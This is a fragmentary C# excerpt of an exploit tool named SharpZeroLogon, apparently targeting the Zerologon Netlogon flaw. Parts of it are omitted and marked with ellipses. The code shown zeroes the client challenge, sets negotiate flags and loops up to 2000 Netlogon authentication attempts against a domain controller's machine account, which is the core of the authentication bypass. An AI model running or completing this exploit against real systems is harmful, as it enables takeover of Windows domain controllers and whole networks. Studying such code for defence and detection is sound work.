...
namespace SharpZeroLogon
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            ClientChallenge.data = new byte[8];
            NETLOGON_CREDENTIAL ServerChallenge = new NETLOGON_CREDENTIAL();
            ServerChallenge.data = new byte[8];
            int NegotiateFlags = 0x212fffff;
            int ServerSecureCh = 6;
            Console.WriteLine("Performing authentication attempts...");

            for (int i = 0; i < 2000; i++)
            {
                if (I_NetServerReqChallenge(fqdn, hostname, ref ClientChallenge, out ServerChallenge) != 0)
                {
                ...
                if (I_NetServerAuthenticate2(fqdn, hostname + "$", ServerSecureCh,
                    hostname, ref ClientChallenge, out ServerChallenge, ref NegotiateFlags) == 0)
                {
